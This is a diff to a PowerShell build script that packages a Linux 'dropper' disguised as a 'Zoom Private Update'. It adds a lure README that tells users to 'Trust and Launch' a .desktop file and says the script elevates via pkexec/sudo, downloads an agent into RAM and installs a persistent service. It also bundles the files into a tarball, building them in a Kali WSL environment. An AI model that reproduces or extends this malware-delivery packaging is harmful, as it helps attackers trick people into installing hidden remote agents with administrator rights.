@@ -86,7 +86,38 @@ foreach ($f in @($scriptPath, $desktopPath)) {
     } catch { }
 }
 
-$sums = foreach ($file in @($scriptPath, $desktopPath, (Join-Path $dist 'zoom-private.png'), (Join-Path $dist 'zoom-private.svg'))) {
+$readme = @"
+Zoom Private Update - Linux bundle
+
+1. Extract this archive (executable bits are already set).
+2. Double-click "Zoom_Update_v6.1.0.desktop".
+   If the file manager asks to trust the launcher, choose "Trust and Launch".
+3. If your desktop has no launcher support, run the script directly:
+   ./Zoom_Update_v6.1.0.sh
+   (it is already executable).
+
+The script asks for administrator rights once via pkexec/sudo, downloads the
+agent to RAM, verifies SHA-256, installs a per-user service and starts it.
+
+Hashes: see SHA256SUMS-linux-dropper.
+"@ -replace "`r`n", "`n"
+$readmePath = Join-Path $dist "$base.README.txt"
+[IO.File]::WriteAllText($readmePath, $readme, (New-Object Text.UTF8Encoding($false)))
+
+$tarPath = Join-Path $dist "$base.tar.gz"
+Remove-Item -LiteralPath $tarPath -Force -ErrorAction SilentlyContinue
+$tarFiles = @("$base.sh", "$base.desktop", 'zoom-private.png', 'zoom-private.svg', "$base.README.txt", 'SHA256SUMS-linux-dropper')
+if ((Get-Command wsl.exe -ErrorAction SilentlyContinue) -and (Get-Command wsl.exe).Source) {
+    $unix = '/mnt/' + $dist.Substring(0, 1).ToLower() + ($dist.Substring(2) -replace '\\', '/')
+    $inner = "cd '$unix' && tar --mode='u+rwx,go+rx' -czf '$base.tar.gz' " + ($tarFiles -join ' ')
+    & wsl.exe -d kali-linux -- bash -lc $inner
+    if ($LASTEXITCODE -ne 0) { throw 'tar bundle failed' }
+} else {
+    & tar --mode='u+rwx,go+rx' -czf $tarPath -C $dist @tarFiles
+    if ($LASTEXITCODE -ne 0) { throw 'tar bundle failed' }
+}
+
+$sums = foreach ($file in @($scriptPath, $desktopPath, (Join-Path $dist 'zoom-private.png'), (Join-Path $dist 'zoom-private.svg'), $tarPath)) {
     $h = (Get-FileHash -LiteralPath $file -Algorithm SHA256).Hash.ToLowerInvariant()
     "$h  $(Split-Path -Leaf $file)"
 }
